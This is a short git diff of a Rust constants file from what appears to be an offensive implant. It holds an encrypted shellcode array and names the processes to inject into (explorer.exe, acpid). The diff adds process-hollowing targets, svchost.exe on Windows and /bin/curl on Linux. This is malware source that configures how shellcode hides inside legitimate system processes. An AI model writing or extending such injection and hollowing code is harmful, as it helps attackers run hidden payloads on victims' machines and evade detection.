@@ -20,3 +20,8 @@ pub const ENCRYPTED_LINUX_SHELLCODE: &[u8] = &[0x6b, 0x2b, 0x5b, 0x9d, 0x6f, 0x0
 pub const WINDOWS_MIGRATION_TARGET: &str = "explorer.exe";
 // Linux process to inject into
 pub const LINUX_MIGRATION_TARGET: &str = "acpid";
+
+// Windows process to hollow (using a full path is advised)
+pub const WINDOWS_HOLLOWING_TARGET: &str = "C:\\Windows\\System32\\svchost.exe";
+// Linux process to hollow (using a full path is advised)
+pub const LINUX_HOLLOWING_TARGET: &str = "/bin/curl";
